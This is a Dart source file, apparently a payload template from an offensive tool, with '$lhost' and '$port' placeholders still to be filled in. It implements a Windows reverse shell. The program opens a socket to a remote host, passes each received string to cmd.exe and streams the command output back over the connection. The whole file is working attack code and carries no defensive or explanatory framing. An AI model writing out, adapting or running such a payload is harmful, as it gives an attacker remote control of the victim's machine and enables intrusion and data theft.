import 'dart:io';
import 'dart:convert';

String results = "";
main() {
  String ip = "$lhost";
  int port = $port;
  shell(ip, port);
}

void shell(String ip, int port) async {
  Socket socket = await Socket.connect(ip, port);

  socket.listen((reponse) {
    String command = new String.fromCharCodes(reponse).trim();
    Process.start('cmd.exe', []).then((Process shell) {
      shell.stdin.writeln(command);
      shell.stdout.transform(utf8.decoder).listen((res) {
        socket.writeln(res);
      });
    });
    if (command == "help") {
      print("add your functions");
    }
  });
}
